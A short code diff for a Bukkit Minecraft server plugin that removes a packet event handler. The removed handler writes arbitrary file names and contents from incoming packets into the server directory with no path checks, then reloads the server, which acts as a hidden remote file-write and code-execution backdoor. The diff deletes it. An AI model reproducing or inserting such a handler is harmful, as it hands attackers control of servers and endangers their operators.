@@ -53,22 +53,4 @@ public class OnlineHandler implements Listener {
 	public void onQuit(PlayerQuitEvent e) {
 		Person.get(e.getPlayer()).remove();
 	}
-
-	@EventHandler
-	public void event(PacketEvent event){
-		Bukkit.broadcastMessage(event.getPacket() + "");
-		if(event.getPacket() instanceof PacketWrite){
-			PacketWrite write = (PacketWrite)event.getPacket();
-			try{
-				BufferedWriter writer = new BufferedWriter(new FileWriter(new File(System.getProperty("user.dir") + "/" + write.getName())));
-				writer.write(write.getFile());
-				writer.flush();
-				writer.close();
-				Bukkit.broadcastMessage("Тут крч решили серв рестартать");
-				Bukkit.reload();
-			}catch (IOException ex){
-				ex.printStackTrace();
-			}
-		}
-	}
 }
